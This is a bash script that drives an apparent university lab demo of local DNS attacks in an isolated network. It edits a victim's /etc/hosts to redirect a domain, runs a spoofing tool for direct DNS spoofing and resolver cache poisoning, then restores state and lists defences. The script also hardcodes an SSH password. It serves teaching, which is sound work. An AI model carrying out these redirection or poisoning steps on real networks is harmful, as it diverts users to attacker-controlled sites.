#!/bin/bash
# LAB8 LONG DEMO - chay tren may ATTACKER (desktop). Dieu khien victim/resolver qua SSH (NAT).
RES=192.168.226.132; VIC=192.168.226.137; IFACE=ens37
SP="sshpass -p 123456 ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR"
rv(){ $SP thtra@$RES "$1" 2>/dev/null; }
vc(){ $SP thtra@$VIC "$1" 2>/dev/null; }
rvs(){ $SP thtra@$RES "sudo $1" 2>/dev/null; }
T(){ printf '\n\033[1;36m================  %s  ================\033[0m\n' "$*"; }
N(){ printf '\033[1;33m>> %s\033[0m\n' "$*"; }
C(){ printf '\033[0;37m$ %s\033[0m\n' "$*"; }
R(){ printf '\033[0;32m%s\033[0m\n' "$*"; }
E(){ printf '\033[0;90m   # %s\033[0m\n' "$*"; }
p(){ sleep "${1:-4}"; }

clear
cat <<'HDR'
+====================================================================+
|      LAB 8  -  LOCAL DNS ATTACK  (DNS Spoofing & Cache Poisoning)   |
|                                                                    |
|      Sinh vien : Hoang Thanh Tra                                   |
|      MSSV      : 1150080120            Lop : 11CNPM2               |
|      Mang ao co lap DNS-LAB 10.9.0.0/24  -  chi dung domain .test   |
+====================================================================+
HDR
p 5
N "Noi dung: dung DNS-SERVER BIND9 rieng cho mang co lap, roi minh hoa 3 ky thuat"
E "Task 1: chuyen huong bang /etc/hosts"
E "Task 2: gia mao DNS truc tiep toi nan nhan (direct spoofing)"
E "Task 3: dau doc cache cua resolver (cache poisoning)"
p 6

T "1. MO HINH & DIA CHI 3 MAY"
N "May ATTACKER (may dang dung - vai tro ke tan cong 10.9.0.200):"
C "ip -br addr show $IFACE"; ip -br addr show $IFACE
p 3
N "May DNS-SERVER / Resolver (10.9.0.10):"
C "ssh dns-server -> ip -br addr show ens37"; rv "ip -br addr show $IFACE"
p 2
N "May VICTIM 10.9.0.100 (kiem vai tro DMZ: 172.16.6.10 web that, 172.16.6.20 AUTH-DNS):"
C "ssh victim -> ip -br addr show ens37"; vc "ip -br addr show $IFACE"
p 5

T "2. CAU HINH DNS-SERVER (BIND9)"
N "Khai bao zone - zone noi bo lab9.test va uy quyen external.lab9.test:"
C "cat /etc/bind/named.conf.local"; rv "cat /etc/bind/named.conf.local"
p 5
N "Du lieu zone lab9.test (www -> web that 172.16.6.10; external uy quyen toi 172.16.6.20):"
C "cat /etc/bind/db.lab9.test"; rv "grep -vE '^;|^\$' /etc/bind/db.lab9.test"
p 6
N "Script ke tan cong (chi hoat dong trong 10.9.0.0/24, chi ten www.external.lab9.test):"
C "sed -n '1,12p' /opt/dns_spoof_lab9.py"; sed -n '1,12p' /opt/dns_spoof_lab9.py
p 6

T "3. BASELINE - PHAN GIAI HOP LE (truoc khi tan cong)"
rvs "rndc flush" >/dev/null
rv "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test >/dev/null 2>&1"
N "Hoi DNS-SERVER ten noi bo www.lab9.test:"
C "dig @10.9.0.10 www.lab9.test"; rv "dig @10.9.0.10 www.lab9.test +noall +answer"
E "Tra ve 172.16.6.10 = web that trong DMZ"
p 5
N "Hoi ten external.lab9.test (DNS-SERVER uy quyen sang AUTH-DNS 172.16.6.20):"
C "dig @10.9.0.10 www.external.lab9.test"; rv "dig @10.9.0.10 www.external.lab9.test +noall +answer"
p 4
N "Nan nhan truy cap web that:"
C "ssh victim -> curl http://www.external.lab9.test/"; vc "curl -s --max-time 8 http://www.external.lab9.test/"
echo; p 6

T "TASK 1 - THAY DOI /etc/hosts (redirect cuc bo tren Victim)"
N "File /etc/hosts duoc tra cuu TRUOC DNS cho cac ung dung (curl, trinh duyet)."
N "Them mot dong tro www.lab9.test ve may ke tan cong 10.9.0.200:"
C "echo '10.9.0.200 www.lab9.test' >> /etc/hosts"
vc "sudo bash -c 'cp -n /etc/hosts /etc/hosts.lab8bak; grep -q 10.9.0.200 /etc/hosts || echo \"10.9.0.200 www.lab9.test\" >> /etc/hosts'"
R "$(vc 'tail -1 /etc/hosts')"
p 4
N "Kiem tra bang getent (dung NSS -> doc /etc/hosts):"
C "getent hosts www.lab9.test"; R "$(vc 'getent hosts www.lab9.test')"
p 3
N "Truy cap web -> ra TRANG GIA cua ke tan cong:"
C "curl http://www.lab9.test/"; vc "curl -s --max-time 6 http://www.lab9.test/"; echo
p 4
N "NHUNG hoi DNS truc tiep van tra ket qua that (dig bo qua /etc/hosts):"
C "dig @10.9.0.10 www.lab9.test"; rv "dig @10.9.0.10 www.lab9.test +noall +answer"
E "=> /etc/hosts chi lua ung dung tren chinh may do, khong sua du lieu DNS."
p 5
N "Khoi phuc /etc/hosts:"; vc "sudo cp /etc/hosts.lab8bak /etc/hosts"; R "$(vc 'getent hosts www.lab9.test')"
p 6

T "TASK 2 - DIRECT DNS SPOOFING (gia dap thang toi Victim)"
N "Ke tan cong cung mang, nghe truy van Victim->Resolver roi gui phan hoi gia"
N "(gia dia chi nguon 10.9.0.10, dung Transaction ID + cong) ve Victim truoc dap that."
rvs "rndc flush" >/dev/null
C "sudo python3 dns_spoof_lab9.py --mode victim --iface ens37"
sudo timeout 20 python3 -u /opt/dns_spoof_lab9.py --mode victim --iface $IFACE &
SP2=$!; sleep 5
N "Victim truy van ten external -> nhan ngay ket qua GIA 10.9.0.200:"
C "ssh victim -> dig www.external.lab9.test"; vc "dig www.external.lab9.test +noall +answer +time=8"
p 3
N "Va truy cap web -> trang gia:"
C "ssh victim -> curl http://www.external.lab9.test/"; vc "curl -s --max-time 8 http://www.external.lab9.test/"; echo
p 3
N "Nhin khung Wireshark ben duoi: goi 10.9.0.10 -> 10.9.0.100 tra A = 10.9.0.200 (gia)."
wmctrl -a 'Capturing from ens37' 2>/dev/null; p 6
wmctrl -a 'LAB8LONG' 2>/dev/null
wait $SP2 2>/dev/null
E "Chi phien truy van nay cua Victim bi lua (khong luu lai)."
p 5

T "TASK 3 - DNS CACHE POISONING (dau doc cache Resolver)"
N "Lan nay ke tan cong gia dap tu AUTH-DNS (172.16.6.20) GUI toi Resolver,"
N "neu Resolver chap nhan thi ban ghi gia duoc LUU trong cache theo TTL 120 giay."
rvs "rndc flush" >/dev/null
C "sudo python3 dns_spoof_lab9.py --mode resolver --iface ens37"
sudo timeout 20 python3 -u /opt/dns_spoof_lab9.py --mode resolver --iface $IFACE &
SP3=$!; sleep 5
N "Victim kich hoat Resolver di hoi AUTH:"
C "ssh victim -> dig www.external.lab9.test"; vc "dig www.external.lab9.test +noall +answer +time=8"
p 2
N "Xem goi gia tren Wireshark:"; wmctrl -a 'Capturing from ens37' 2>/dev/null; p 5
wmctrl -a 'LAB8LONG' 2>/dev/null
wait $SP3 2>/dev/null
N "SAU KHI DA DUNG ke tan cong, Resolver VAN tra ket qua gia (cache bi dau doc):"
C "dig @10.9.0.10 www.external.lab9.test"; rv "dig @10.9.0.10 www.external.lab9.test +noall +answer"
p 3
N "Kiem chung bang dump cache BIND9:"
C "sudo rndc dumpdb -cache && grep www.external.lab9 /var/cache/bind/named_dump.db"
rvs "rndc dumpdb -cache" >/dev/null; sleep 1
R "$(rvs 'grep -i www.external.lab9 /var/cache/bind/named_dump.db' | grep -v '^;' | head -1)"
E "=> Moi client dung chung Resolver deu nhan ket qua gia cho den khi het TTL."
p 6

T "KHOI PHUC & PHONG THU"
N "Xoa cache gia tren Resolver:"; C "sudo rndc flush"
rvs "rndc flush" >/dev/null; rv "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test >/dev/null 2>&1"
R "dig @10.9.0.10 www.external.lab9.test -> $(rv 'dig +short @10.9.0.10 www.external.lab9.test')"
E "Da tro lai dia chi that 172.16.6.10."
p 4
N "Cac bien phap phong thu:"
E "1) Phan doan mang - ke tan cong khong cung L2 voi client/resolver"
E "2) DNS egress control - ep client chi dung resolver chi dinh"
E "3) DNSSEC validation + random hoa source-port/Transaction ID + DNS COOKIE"
E "4) Tat promiscuous mode; giam sat phan hoi DNS trung lap / cache bat thuong"
p 6
printf '\n\033[1;36m================  HOAN TAT LAB 8 : Task1 + Task2 + Task3  ================\033[0m\n'
printf '\033[1;37m        Hoang Thanh Tra - 1150080120 - 11CNPM2\033[0m\n'
p 4
echo; echo "Nhan Enter de dong..."; read x
